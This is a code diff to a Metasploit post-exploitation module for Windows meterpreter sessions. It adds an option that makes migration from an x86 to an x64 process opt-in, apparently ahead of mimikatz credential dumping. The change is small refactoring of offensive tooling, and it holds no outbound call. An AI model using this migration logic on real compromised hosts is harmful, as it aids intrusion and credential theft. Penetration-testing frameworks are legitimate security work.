@@ -24,6 +24,9 @@ class Metasploit3 < Msf::Post
       'Platform'     => ['win'],
       'SessionTypes' => ['meterpreter']
     ))
+    register_options([
+      OptBool.new('MIGRATE', [false, 'Migrate to x64 process', false])
+    ])
   end
 
   def run
@@ -34,15 +37,20 @@ class Metasploit3 < Msf::Post
 
     print_status("Running module against #{sysinfo['Computer']}")
     if (client.platform =~ /x86/) && (client.sys.config.sysinfo['Architecture'] =~ /x64/)
-      print_status('Running on x86 trying to migrate to a x64 process')
-      processes = client.sys.process.get_processes
-      uid = client.sys.config.getuid
-      possible_procs = gather_procs(processes, uid)
-      possible_procs.each do |proc|
-        break if attempt_migration(proc['pid'])
-      end
-      if client.platform =~ /x86/
-        print_error("Couldn't migrate to x64 process")
+      if datastore['MIGRATE']
+        print_status('Running on x86 trying to migrate to a x64 process')
+        processes = client.sys.process.get_processes
+        uid = client.sys.config.getuid
+        possible_procs = gather_procs(processes, uid)
+        possible_procs.each do |proc|
+          break if attempt_migration(proc['pid'])
+        end
+        if client.platform =~ /x86/
+          print_error("Couldn't migrate to x64 process")
+          return
+        end
+      else
+        print_error('x64 platform requires x64 meterpreter and mimikatz extension')
         return
       end
     end
